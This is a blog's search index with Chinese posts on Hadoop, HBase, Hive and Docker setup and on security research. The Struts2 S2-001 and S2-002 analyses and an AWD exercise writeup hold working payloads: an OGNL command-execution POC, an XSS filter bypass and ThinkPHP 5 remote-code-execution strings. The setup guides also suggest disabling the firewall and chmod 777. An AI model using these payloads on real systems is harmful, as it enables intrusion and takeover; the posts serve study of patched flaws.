<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[java代码审计入门之s2-002复现分析]]></title>
    <url>%2Fjava%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E4%B9%8Bs2-002%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x00 前言入门JAVA代码审计的第二篇文章，复现分析S2-001 xss漏洞。 0x01 环境搭建本环境可以在s1-001漏洞环境上搭建，可参考前面的文章java代码审计入门之s2-001复现分析 在上面环境的基础上，继续创建xss_test.jsp12345678910&lt;%@ taglib prefix="s" uri="/struts-tags" %&gt;&lt;%@ page contentType="text/html;charset=UTF-8" language="java" %&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;S2-002&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;a href="&lt;s:url action="Xss" includeParams="all" &gt;&lt;/s:url&gt;"&gt;你好Struts2&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 创建Xss.java class12345678package com.demo.action;import com.opensymphony.xwork2.ActionSupport;public class Xss extends ActionSupport&#123; public String execute() throws Exception &#123; return SUCCESS; &#125;&#125; struct.xml中添加123&lt;action name="Xss" class="com.demo.action.Xss"&gt; &lt;result name="success"&gt;xss_test.jsp&lt;/result&gt;&lt;/action&gt; 0x02 代码分析首先看一下官方关于漏洞的描述可以看到漏洞主要原因是Struts 2框架在处理&lt;s:url&gt; 和&lt;s:a&gt;标签时，未对标签内的字符进行转义，导致XSS漏洞。在我们搭建的Demo中，以&lt;s:url&gt;标签为例进行分析这里需要说明的是struts2允许使用自定义的其自定义的标签，如上面的&lt;s:url&gt;即为struct2 url标签。在使用struts2标签时需在页面中添加&lt;%@ taglib uri =&quot;/struts-tags&quot; prefix =&quot;s&quot; %&gt;。引入标签配置。该配置在struts2-core核心jar包中,META-INF/struts-tags.tld对struts2标签进行了定义。比如我们本次使用的&lt;s:url&gt;&lt;tag-class&gt;org.apache.struts2.views.jsp.URLTag&lt;/tag-class&gt;说明了标签的具体实现类为org.apache.struts2.views.jsp.URLTag在本例中&lt;s:url&gt;标签在xss_test.jps中，jsp的本质也是一个Servlet，在执行jsp的时候tomcat会将其转化为java代码，当struts2在解析到标签时，实际上是继承了http servlet中可扩展的BodyTagSupport类。然后依次执行12345doStartTag()setBodyContent()doInitBody()doAfterBody()doEndTag() 我们从doStartTag方法下断开始跟踪。使用payload访问localhost:8080/test_war_exploded/Xss.action?&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;=boogle在doStartTag方法中通过gettBean()方法获取URL组件,然后通过populateParams()方法对获取的URL组件中属性进行赋值。然后执行this.component.start(this.pageContext.getOut())方法，即前面提到的URL组件的start方法。跟进该方法首先会判断&lt;s:url&gt;标签中设置的includeParams参数，该属性有三个值：none get all，默认值为get。属性值为get时，该url会将访问其所在jsp的的请求的所有get方法的参数添加到自身来 ，属性值为all时更是将get和post的的参数值全部添加到自身来，属性值为none时不添加。本例中我们设置的参数值为all，之后便进入到includeParams值为all的流程，执行mergeRequestParameters方法。跟进在该方法中取到我们的payload，并保存在parameters中。然后回到URL组件的start方法中，继续执行进入到includeGetParameters方法。该方法中使用extractQueryString方法获得参数信息，该方法会直接调用HttpServletRequest的getQueryString的方法直接获取浏览器发送的请求信息。之后又调用UrlHelper.parseQueryString(query)以&amp;为分隔符将获取的请求信息分隔出不同的参数。将参数保存在queryParams在该过程中会对参数的value值使用translateAndDecode编码处理，而不会对参数name进行任何处理。然后继续执行进入mergeRequestParameters将参数名称和值保存到parameters中。至此doStartTag工作完成，然后进入到doEndTag方法然后进入end方法，实现对标签的内容渲染工作。 0x03 补丁分析1234567891011121314151617//if the action was not explicitly set grab the params from the request if (escapeAmp) &#123; buildParametersString(params, link); &#125; else &#123; buildParametersString(params, link, "&amp;"); &#125; String result = link.toString(); while (result.indexOf("&lt;script&gt;") &gt; 0) &#123; result = result.replaceAll("&lt;script&gt;", "script"); &#125; try &#123; result = encodeResult ? response.encodeURL(result) : result; &#125; catch (Exception ex) &#123; // Could not encode the URL for some reason // Use it unchanged result = link.toString(); &#125; 补丁使用while循环对&lt;script&gt;进行去除，仍可使用&lt;script boogle&gt;样式绕过。payload1"&gt;&lt;script boogle&gt;alert(1)&lt;/script&gt;=boogle 0x04 参考Struts2标签原理分析https://www.iflym.com/index.php/code/resolve-error-codec-problem-while-use-s-url-or-s-a-on-struts2.html]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>java</tag>
        <tag>struts2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Centos7配置安装HIVE]]></title>
    <url>%2FCentos7%E9%85%8D%E7%BD%AE%E5%AE%89%E8%A3%85HIVE%2F</url>
    <content type="text"><![CDATA[0x00 前言Hive是一个数据仓库基础工具在Hadoop中用来处理结构化数据。它架构在Hadoop之上，总归为大数据，并使得查询和分析方便。并提供简单的sql查询功能，可以将sql语句转换为MapReduce任务进行运行。引自https://www.yiibai.com/hive/ 本次在安装hadoop基础上配置安装HIVE数据仓库。Hadoop安装教程参考Centos7搭建Hadoop伪分布式集群详细步骤 0x01 配置安装HIVE下载首先下载HIVE,为了与Hadoop3.2.0,我选择的hive版本为3.1.1 配置环境变量下载完成后进行解压，根据解压目录自行配置环境变量12vi .bashrc //配置环境变量source .bashrc //使配置生效 修改配置文件移动到HIVE安装目录下的conf文件夹执行1234567cp hive-env.sh.template hive-env.sh cp hive-default.xml.template hive-site.xml cp hive-log4j2.properties.template hive-log4j2.properties cp hive-exec-log4j2.properties.template hive-exec-log4j2.properties 修改hive-env.sh,添加JAVA_HOME,HADOOP_HOME及HIVE配置文件目录，请根据自己环境自行修改如下 Schema初始化执行schematool -initSchema -dbType derby执行成功效果如下如果执行failed，修改hive-3.1.1/scripts/metastore/upgrade/derby目录下的hive-schema-2.1.0.derby.sql按下图将框中内容使用注释符--注释重新执行schematool -initSchema -dbType derby 启动HIVESchema初始化成功后即可启动hive，命令hive启动成功如下，如出现报错，请移至文末0x03 问题解决查看笔者记录部分问题解决方法 0x02 HIVE命令详细命令参考Hive常用命令 0x03 问题解决expansion character问题解决方法：修改报错的hive-site.xml,将报错位置3210行第96个字符删掉 ${system:xxx}路径错误问题出现该问题的主要原因是hive配置文件中不能使用冒号目录定义方法，可将其直接修改为目录。如配置文件中用${system:java.io.tmpdir}定义的路径改为/tmp/,${system:user.name}定义的路径改为${user.name}，其他类似可使用cat -n hive-site.xml |grep system:定位到出现问题的位置]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>hadoop</tag>
        <tag>hive</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java代码审计入门之s2-001复现分析]]></title>
    <url>%2Fjava%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E4%B9%8Bs2-001%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x00 前言入门JAVA代码审计的第一篇文章，还是决定以漏洞之王struts2下手，本篇即以学习为目的，复现分析S2-001,虽然该漏洞已过去十多年，但是前前后后还是折腾了好几天。 0x01 环境搭建工具选择使用了IDEA，下面记录一下如何使用IDEA创建第一个struts2项目。IDEA需下载Ultimate版本,Community版本无法创建Java EE工程。首先New Project创建Struts2项目，Libraries选择Set up library later下一步之后填写项目名称即可创建起一个struts2 project下载struts-2.0.1-all 在项目目录WEB-INF下新建lib文件夹，将所需要的jar包从下载目录中导入到lib文件夹下 将全部jar包选中，右键Add as Library填写一个Library Name然后File-&gt;Project strutsure然后在Modules下选中struts2-001之后再在Artifacts如下图将struts2-001put into output root，完成后点击OK.之后按下图创建Tomcat server在配置页面点击Fix,其他默认即可。至此即可看到一个struts2项目启动成功。因为漏洞是在表单验证失败时发生的，这里继续编写一个表单验证的Demo，以复现漏洞。在WEB目录下修改index.jsp123456789101112131415&lt;%@ page contentType="text/html; charset=UTF-8" %&gt;&lt;%@ taglib prefix="s" uri="/struts-tags" %&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Sign On&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;s:form action="Login"&gt; &lt;s:textfield label="username" name="username"/&gt; &lt;s:textfield label="password" name="password" /&gt; &lt;s:submit/&gt;&lt;/s:form&gt;&lt;/body&gt;&lt;/html&gt; 然后新建welcome.jsp123456789101112&lt;%@ page contentType="text/html; charset=UTF-8" %&gt;&lt;%@ taglib prefix="s" uri="/struts-tags" %&gt;&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt; &lt;title&gt;S2-001&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;Hello &lt;s:property value="username"&gt;&lt;/s:property&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 在src下新建com.demo.actionpackage1234567891011121314151617181920212223242526272829303132333435package com.demo.action;import com.opensymphony.xwork2.ActionSupport;public class Login extends ActionSupport &#123; private String username = null; private String password = null; public String getUsername() &#123; return this.username; &#125; public String getPassword() &#123; return this.password; &#125; public void setUsername(String username) &#123; this.username = username; &#125; public void setPassword(String password) &#123; this.password = password; &#125; public String execute() &#123; if ((this.username.isEmpty()) || (this.password.isEmpty())) &#123; return "error"; &#125; if ((this.username.equalsIgnoreCase("admin")) &amp;&amp; (this.password.equals("admin"))) &#123; return "success"; &#125; return "error"; &#125;&#125; 修改struts.xml123456789101112&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE struts PUBLIC "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN" "http://struts.apache.org/dtds/struts-2.0.dtd"&gt;&lt;struts&gt; &lt;package name="s2" extends="struts-default"&gt; &lt;action name="Login" class="com.demo.action.Login"&gt; &lt;result name="success"&gt;welcome.jsp&lt;/result&gt; &lt;result name="error"&gt;index.jsp&lt;/result&gt; &lt;/action&gt; &lt;/package&gt;&lt;/struts&gt; 之后即可运行程序出现登陆Demo 0x02 代码分析在分析之前还是看一下十多年前官方的描述看到问题是因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。第一次分析JAVA代码，还是觉得无从下断分析，但是既然是OGNL表达式导致的问题，那么表达式必然会经过OGNL解析并返回结果，前辈们给出的分析思路便是在OGNL表达式原生API getValue处下断点，该方法用于解析OGNL表达式并返回表达式的值。下断后便可发送payload%{1+1}，直到在断点处出现我们的payload,此时在调用栈中即可看到漏洞发生的整个过程。然后便可以根据调用栈开始分析过程。首先我们的payload是从index.jsp输入的，这里需要了解的是jsp的本质也是一个Servlet，在执行jsp的时候tomcat会将其转化为java代码，比如这里index.jsp被转化为index_jsp.java。之后struts便会调用ComponentTagSupport类中doStartTag doEndTag方法对index_JSP.hava中的struts标签进行处理。上图可以看出，调用doEndTag方法对标签时会调用this.component.end()方法。跟进之后在UIBean类中end方法中会继续调用同类下的evaluateParams跟进evaluateParams，该方法会对标签属性取得name之后判断是否开启altSyntax功能，开启则会用%{}将标签属性值名称包裹，用于使用OGNL表达式对其处理。1altSyntax 功能是 Struts 2 框架用于处理标签内容的一种新语法（不同于普通的 HTML ），该功能主要作用在于支持对标签中的 OGNL 表达式进行解析并执行。该功能在struts2核心配置文件struts.properties中默认开启。 然后username经过上面处理之后，进入到该类下的getValue方法查询表达式的值，继续跟进。在该方法中调用TextParseUtil.translateVariables。之后调用了该类下的同名方法translateVariables，对OGNL表达式进行了递归处理，从而使得我们的payload可以在递归处理时被OGNL表达式执行。继续查看该方法，便可以看到使用了while(true)对表达式进行了递归处理。之后便对表达式去掉%{}调用stack.findValue即OgnlValueStack类下的findValue，并最终调用了Ognl的getValue方法对表达式进行取值在getValue中可以看到取到了我们的payload之后取得的值复制给o并最终复制给expression，继续在while循环中被处理。最终在OGNL表达式中被处理，获得计算结果2。 0x03 漏洞利用POC1%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;"whoami"&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125; 修改new java.lang.String[]{&quot;whoami&quot;}即可执行任意命令 如需参数可这样利用new java.lang.String[]{&quot;net&quot;,&quot;user&quot;} 0x04 补丁分析在XWork2.0.4增加了loopCount判断以取消对OGNL的递归解析 0x05 参考S2-001漏洞分析OGNL设计及使用不当造成的远程代码执行漏洞Struts-001远程代码执行漏洞分析]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>java</tag>
        <tag>struts2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hadoop之Hbase架构环境搭建及使用JAVA API远程连接]]></title>
    <url>%2FHadoop%E4%B9%8BHbase%E6%9E%B6%E6%9E%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8JAVA%20API%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%2F</url>
    <content type="text"><![CDATA[0x00 前言Hbase全称为Hadoop Database，是一个分布式的存储系统。Hbase使用Hadoop的HDFS作为其文件存储系统，使用Hadoop的MapReduce来处理Hbase中的海量数据，使用zookeeper作为其协调工具。 查看本教程之前，请确保已安装配置好Hadoop，可参考Centos7搭建Hadoop伪分布式集群详细步骤,使用Hadoop JAVA API 远程连接HDFS 0x01 下载安装下载首先在官网下载Hbase选择对应版本的bin文件，国内根据推荐的清华源下载即可。linux下可使用wget命令下载，我下载的为2.1.4版本1wget http://mirrors.tuna.tsinghua.edu.cn/apache/hbase/2.1.4/hbase-2.1.4-bin.tar.gz 解压下载后即可解压到目录,我这里直接在当前目录解压1tar -zxvf hbase-2.1.4-bin.tar.gz 配置环境变量进入解压后的目录使用pwd命令查看路径然后修改.bashrc配置环境变量 12345vi ~/.bashrc在最后添加export HBASE_HOME=/home/wzb/hbase-2.1.4export PATH=$PATH:$HBASE_HOME/bin保存后退出 然后使用source ~/.bashrc命令使配置生效然后输入命令hbase可看到环境变量配置成功 0x02 启动Hbase在启动hbase之前。首先进行相应的配置修改 配置hbase-env.sh修改hbase所在目录下的conf目录的hbase-env.sh如我的位置为/home/wzb/hbase-2.1.4/conf/hbase-env.sh首先配置环境变量export JAVA_HOME=/usr/local/java/jdk1.8.0_201,此处修改为你的java环境变量，如不知道，可通过echo $JAVA_HOME查看然后配置export HBASE_MANAGES_ZK=true,使用其自带的zookeeper 配置hbase-site.xml然后继续配置conf目录下的hbase-site.xml123456789101112131415161718192021222324252627&lt;configuration&gt; &lt;property&gt; &lt;name&gt;hbase.rootdir&lt;/name&gt; &lt;value&gt;hdfs://192.168.111.147:9000/hbase&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hbase.zookeeper.quorum&lt;/name&gt; &lt;value&gt;192.168.111.147&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hbase.cluster.distributed&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hbase.zookeeper.property.dataDir&lt;/name&gt; &lt;value&gt;/home/wzb/Hbase/zookeeper/tmp&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hbase.unsafe.stream.capability.enforce&lt;/name&gt; &lt;value&gt;false&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hbase.wal.provider&lt;/name&gt; &lt;value&gt;filesystem&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 注意标识处根据自己环境修改 下载htrace-core-3.1.0-incubating.jar下载htrace-core-3.1.0-incubating.jar并移至hbase安装目录下的lib文件夹 启动start-hbase.sh配置修改好后即可通过start-hbase.sh命令启动在启动之前，请先使用start-all.sh启动hadoop相关进程然后即可使用命令start-hbase.sh启动hbase通过jps可看到比刚才多出来HMaster HRegionServer HQuorumPeer三个进程，如后面出现错误可看查这些进程是否正常启动，如未启动移步文章末尾问题解决可查笔者记录的解决办法。 访问apache Hbase此处正常启动后继续然后通过浏览器访问http://192.168.111.147:16010/master-status此处ip即为你在hbase-site.xml文件中配置的ip至此Hbase启动成功。 0x03 Hbase shellhbase提供了一个shell的终端给用户交互。使用命令hbase shell进入命令界面。通过执行 help可以看到命令的帮助信息。下图列出常用命令更过命令操作可参考HBase shell 命令介绍 0x04 Java API连接Hbase修改hosts因为Hbase 16000端口绑定为127.0.0.1,所以通过其他主机无法访问，这里唯一的解决方法是修改hosts文件修改linux hostnamesudo vi /etc/sysconfig/network添加以下内容12NETWORKING=yesHOSTNAME=master 修改linux hostssu vi /etc/hosts添加以下内容 1192.168.111.147 master #此处ip添加你的linux ip,hostname填写上面修改的,我这里设置为master。 linux配置完成后需重启系统，以使配置生效。 修改windows hosts文件路径为：C:\Windows\System32\drivers\etc\hosts该文件无权限直接修改，需复制出修改完再覆盖掉最后添加一行192.168.111.147 master，同样此处应与上面相同。配置完成后即可继续下面使用java api连接，不配置可能会导致无法连接。 JAVA API关于java项目创建参见使用Hadoop JAVA API 远程连接HDFS在pom.xml中添加12345&lt;dependency&gt; &lt;groupId&gt;org.apache.hbase&lt;/groupId&gt; &lt;artifactId&gt;hbase-client&lt;/artifactId&gt; &lt;version&gt;1.2.4&lt;/version&gt;&lt;/dependency&gt; 将Hbase-site.xml添加到项目中，如下图新建HBase类，内容如下1234567891011121314151617181920212223242526272829303132333435363738package hadoop;import java.io.IOException;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.hbase.HBaseConfiguration;import org.apache.hadoop.hbase.HColumnDescriptor;import org.apache.hadoop.hbase.HTableDescriptor;import org.apache.hadoop.hbase.TableName;import org.apache.hadoop.hbase.client.Admin;import org.apache.hadoop.hbase.client.Connection;import org.apache.hadoop.hbase.client.ConnectionFactory;public class HBase &#123; public static Configuration conf; public static Connection connection; public static Admin admin; public static void main(String[] args) throws IOException &#123; conf = HBaseConfiguration.create(); conf.set("hbase.master", "192.168.111.147:16000"); connection = ConnectionFactory.createConnection(conf); admin = connection.getAdmin(); HTableDescriptor table = new HTableDescriptor(TableName.valueOf("table1")); table.addFamily(new HColumnDescriptor("group1")); //创建表时至少加入一个列组 if(admin.tableExists(table.getTableName()))&#123; admin.disableTable(table.getTableName()); admin.deleteTable(table.getTableName()); &#125; admin.createTable(table); &#125;&#125; 运行成功后成功创建table1表转到Hbase shell使用list命令可看到新表已创建 0x05 问题解决此处容易出现的问题为HMaster启动后闪退。可通过查看hbase安装目录下的logs文件内log日志确定该问题。 HDFS问题 首先查看hbase-wzb-master-wzb_node1.log，此处查看你的master日志文件发现9000的HDFS连接失败首先浏览器访问你的ip的9000端口，即hdfs服务，访问成功如下图如果未访问成功，查看hadoop配置文件core-site.xml查看hdfs是否正确配置为你的ip，不是请修改，确保hbase配置文件中连接的hdfs服务器与你启动的服务器路径相同。配置成功后重启hadoop，再次访问 权限问题同样查看日志问题，如发现前面配置的Hbase文件夹有权限问题，请将Hbase文件夹赋予777权限1chomd 777 Hbase //此处Hbase请添加你hbase-site.xml中配置的hbase.zookeeper.property.dataDir目录 zookeeper未正常启动问题查看hbase-wzb-regionserver-wzb_node1.log此处应修改为你的regionservelog文件出现以下错误说明zookeeper未启动成功。首先查看sudo netstat -anp | grep 2181端口是否被占用，如果占用，找到占用程序并kill掉相关进程。 防火墙问题如果出现其他端口无法访问问题，请关闭防火墙123systemctl stop firewalld.service #停止firewallsystemctl disable firewalld.service #禁止firewall开机启动 其他问题配置过程中可能出现其他各种问题，可查看log文件出现的问题并解决。]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>hadoop</tag>
        <tag>hbase</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker网络模式详解]]></title>
    <url>%2FDocker%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[0x00 前言在最近使用docker搭建环境的过程中，发现docker容器默认的网络模式并不能很好的满足需求，然后便查看了一下docker关于网络配置的官方文档，发现在官方文档中,给出了五种docker的网络模式，还是能比较全面的满足各种需求的，下面介绍一下这几种模式。 0x01 bridge模式bridge模式，这是docker容器启动时默认的网络模式，当启动容器时不提供--net参数时，docker容器便默认以这种模式配置网络环境。这也是在使用docker容器时，最常用的网络模式。关于桥接模式，官方文档时这样说的当您的应用程序在需要通信的独立容器中运行时，通常会使用桥接网络。简单画了个图帮助理解这种模式 实际演示：首先使用默认模式即桥接模式启动两个docker容器,并查看其ip测试两台容器间互通通过命令docker exec bridge1 ip addr show看到两个容器均虚拟出了自己的网卡eth0查看宿主机网卡，可发现多出来docker0，而此网卡即为各桥接模式启动的容器的网关同时宿主机上还多出来两个veth开头的网卡，其伴随着桥接模式容器的eth0网卡出现而出现。其作用为连通docker0与容器内网卡eth0。因此docker0并不只是一个简单的网卡了，而是一个网桥。 0x02 host模式使用host模式时容器将不会获得一个独立的Network Namespace，而是和宿主机共用一个Network Namespace。容器将不会虚拟出自己的网卡，配置自己的IP等，而是使用宿主机的IP和端口。但是，容器的其他方面，如文件系统、进程列表等还是和宿主机隔离的。实际演示docker run -itd --net=host --name=host awd_zentao /bin/bash查看其网卡发现其与主机一样 0x03 container模式该模式类似于host模式，只不过host模式是主机与容器共享Network Namespace,而container模式是容器之间共享Network Namespace。新创建的容器不会创建自己的网卡，配置自己的 IP，而是和一个指定的容器共享 IP、端口范围等。同样，两个容器除了网络方面，其他的如文件系统、进程列表等还是隔离的。两个容器的进程可以通过 lo 网卡设备通信。实际演示：其配置方式为--net=container:&lt;name_or_id&gt;这里选择与之前的bridge1共享 0x04 none模式使用none模式不会对docker容器进行任何网络配置，只有lo本地环回网络，Docker容器没有网卡、IP、路由等信息。需要我们自己为Docker容器添加网卡、配置IP等。实际演示： 0x05 macvlan模式本次学习正式因为想搭建docker集群与宿主机在同一个c段，以使宿主机同c段主机可以连同docker容器，本来也可以使用bridge模式加端口映射的方法，但发现使用macvlan方式更为合适。macvlan模式可以创建出一个新的自定义模式，其新启动的容器可以按新的模式配置网络环境。实例演示：创建新的macvlan1docker network create -d macvlan --subnet=192.168.111.0/24 --gateway=192.168.111.1 -o parent=ens33 gitlab-net 使用docker network ls可以看到新创建的gitlab-net网络 使用docker run --net=gitlab-net --ip=192.168.111.201 -dit --name test1 awd_zentao即可创建新的容器，可通过--net=gitlab-net指定其为新的模式,--ip参数指定容器ip查看其网卡信息 相对于前面几种模式，该模式更加灵活，可根据实际需求配置出新的模式，满足较为复杂的网络需求。 0x06 overlay模式overlay模式可用于连接不同机器上的docker容器，允许不同机器上的容器相互通信，同时支持对消息进行加密。笔者暂时未用过该模式，具体可参考https://docs.docker.com/network/overlay/]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Hadoop JAVA API 远程连接HDFS]]></title>
    <url>%2F%E4%BD%BF%E7%94%A8Hadoop-JAVA-API-%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5HDFS%2F</url>
    <content type="text"><![CDATA[0x00 前言关于hadoop的搭建，可以参考之前的一篇文章Centos7搭建Hadoop伪分布式集群详细步骤本篇主要讲解如何使用Hadoop java api远程连接hadoop分布式文件系统（HDFS） 0x01 本地操作HDFS在远程连接HDFS之前，先本地操作一波，便于对HDFS有个更深层的认识。 首先应该对HDFS的概念有个认识，他就是一个文件系统，只不过是适应于hadoop的分布式文件系统，既然是文件系统，其就可以执行跟普通文件系统一样的操作，例如文件操作，目录操作等。下面演示几个简单的例子。 列出目录文件hadoop fs -ls \ 创建文件hadoop fs -touchz /hello 更多命令参考hadoop HDFS常用文件操作命令 0x02 IDEA远程连接HDFS准备环境首先在windows环境下安装hadoop并配置环境变量。windows下配置java jdk。下载winutils：https://github.com/steveloughran/winutils按照自己hadoop版本选择hadoop.dll winutils.exe放到hadoop bin目录下 建立工程在IDEA下新建Maven工程 创建过程中右下角会出现import提醒，点击import。 创建完成后下载对应版本的hadoop pom.xml文件这里我的为12345678910111213141516171819202122232425&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.hadoop&lt;/groupId&gt; &lt;artifactId&gt;hadoop-common&lt;/artifactId&gt; &lt;version&gt;3.2.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.hadoop&lt;/groupId&gt; &lt;artifactId&gt;hadoop-mapreduce-client-core&lt;/artifactId&gt; &lt;version&gt;3.2.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.hadoop&lt;/groupId&gt; &lt;artifactId&gt;hadoop-client&lt;/artifactId&gt; &lt;version&gt;3.2.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.hadoop&lt;/groupId&gt; &lt;artifactId&gt;hadoop-hdfs&lt;/artifactId&gt; &lt;version&gt;3.2.0&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 将之前配置的core-site.xml hdfs-site.xml log4j.properties复制到resources目录 目录结构如下 测试新建class1234567891011121314151617181920212223242526272829303132333435package hadoop; import org.apache.hadoop.conf.Configuration; import org.apache.hadoop.fs.FSDataInputStream; import org.apache.hadoop.fs.FSDataOutputStream; import org.apache.hadoop.fs.FileSystem; import org.apache.hadoop.fs.Path; import org.apache.hadoop.io.IOUtils;public class hadoop&#123; public static void main(String[] args)&#123; try&#123; String filename = "hdfs://192.168.111.141:9000/user/input/boogle.txt"; Configuration configuration = new Configuration(); FileSystem fileSystem = FileSystem.get(configuration); if(fileSystem.exists(new Path(filename))) &#123; System.out.println("文件存在"); &#125; else&#123; System.out.println("文件不存在"); &#125; Path inFile = new Path("/user/input/boogle.txt"); FSDataOutputStream os = fileSystem.create(inFile); os.writeUTF("Chinese Hadoop Community"); os.flush(); os.close(); FSDataInputStream is = fileSystem.open(inFile); IOUtils.copyBytes(is,System.out,1024,true); &#125;catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 按照自己环境修改一下上面的代码。 之前本地搭建的时候连接hdfs用的localhost，此处远程连接需换成ip。如我的core-site.xml 查看运行结果 0x03 问题解决因为之前hadoop环境已经搭好，容易出现的问题主要是配置IDEA配置问题和网络连接问题。 关于配置没有详细讲，但是要按照每一个步骤自己操作为，并无难度，勿丢步骤即可。 关于网络连接，主要出现的问题在于防火墙禁止连接9000端口 可通过修改hosts或者修改防火墙配置]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内部AWD攻防对抗web记录]]></title>
    <url>%2F%E5%86%85%E9%83%A8AWD%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97web%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[0x00 前言团队内部进行了一次awd演练，其中web服务器环境基于thinkphp v5.0.7。包含两个个框架通用漏洞，四个魔改过的漏洞，特此记录一下。 0x01 thinkphp5 Request 远程代码执行漏洞该漏洞详情及修复可见本人博客thinkphp5 Request 远程代码执行漏洞分析问题出在核心类Request的method方法。由于未对传入的$method进行限制，导致可以对本类任意方法进行调用且参数可控。payload12//post_method=__construct&amp;method=get&amp;filter=system&amp;boo=whoami 0x02 thinkphp5.x 远程代码执行漏洞该漏洞详情及修复可见本人博客thinkphp5.x 远程代码执行漏洞漏洞的成因是因为在没有开启强制路由的情况下控制器没过滤所引起的远程代码执行漏洞payload1?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1] 0x03 thinkphp 缓存函数设计缺陷 getshell该漏洞详情及修复可见本人博客thinkphp 缓存函数设计缺陷 getshell 漏洞成因是因为thinkphp缓存函数未对其缓存内容进行过滤就直接写入缓存文件。该漏洞利用需要能够控制缓存内容并且猜解缓存文件。这里靶场环境给出了这些很好的条件。 首先漏洞出现在后台网站配置，可以使用弱口令admin admin登陆。配置后调用save方法保存配置内容，其内容未经过过滤保存到数据库。当页面再次载入会进入缓存函数，将提交的内容直接进行缓存。这里很贴心的是直接将缓存目录输出了，不需要进行猜测了。 0x04 sql注入漏洞问题出现再在index.php/index/index/shipinok这里直接将获取的ip带入sql查询跟进getIP()函数，发现未对ip进新过滤。直接构造X-Forwarded-For 0x05 任意文件包含在推广处直接通过post方式获取内容进行了包含 0x06 任意文件上传该漏洞对thinkphp file类进行了魔改，使上传文件验证规则为空，造成任意文件上传。文件名为MD5(filename+’x’)在多处上传中均存在该问题。这里以代理后台头像上传为例然后得到文件保存位置即可。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>AWD</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Centos7搭建Hadoop伪分布式集群详细步骤]]></title>
    <url>%2FCentos7%E6%90%AD%E5%BB%BAHadoop%E4%BC%AA%E5%88%86%E5%B8%83%E5%BC%8F%E9%9B%86%E7%BE%A4%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4%2F</url>
